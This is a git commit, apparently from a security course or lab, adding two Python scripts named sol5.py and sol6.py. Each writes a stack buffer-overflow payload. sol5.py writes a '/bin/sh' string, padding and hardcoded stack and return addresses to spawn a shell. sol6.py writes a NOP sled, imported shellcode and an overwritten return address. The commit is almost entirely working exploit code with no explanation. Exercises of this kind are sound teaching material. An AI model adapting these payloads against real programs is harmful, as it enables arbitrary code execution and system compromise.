3acc830cb02325c7d35e45b2b365b0800cff191e
jordynk <jordyn13470@gmail.com>
2024-04-03 17:08:29 +0000

    sol5

--- sol5.py
+++ sol5.py
@@ -1,3 +1,21 @@
 #!/usr/bin/env python3
 
 import sys
+
+bin = b'/bin/sh\x00'
+sys.stdout.buffer.write(bin)
+sys.stdout.buffer.write(b'\x00'*(10-len(bin)))
+sys.stdout.buffer.write(b'\x00'*8)
+sys.stdout.buffer.write(b'\x00'*8)
+sys.stdout.buffer.write(0x7ffffff6adfe.to_bytes(8, "little"))
+sys.stdout.buffer.write(0x401e21.to_bytes(8, "little"))
+sys.stdout.buffer.write(0x401e21.to_bytes(8, "little"))
+
+
+
+
+
+
+
+# bin addr: 0x00007ffffff6adfe
+#return addr: 0x7ffffff6ae18
--- sol6.py
+++ sol6.py
@@ -3,3 +3,9 @@
 import sys
 
 from shellcode import shellcode
+
+sys.stdout.buffer.write(b'\x90'*964)
+sys.stdout.buffer.write(shellcode)
+
+#padding = 1024 - 256 - len(shellcode)
+sys.stdout.buffer.write(0x7ffffff6acb8.to_bytes(8, "little"))
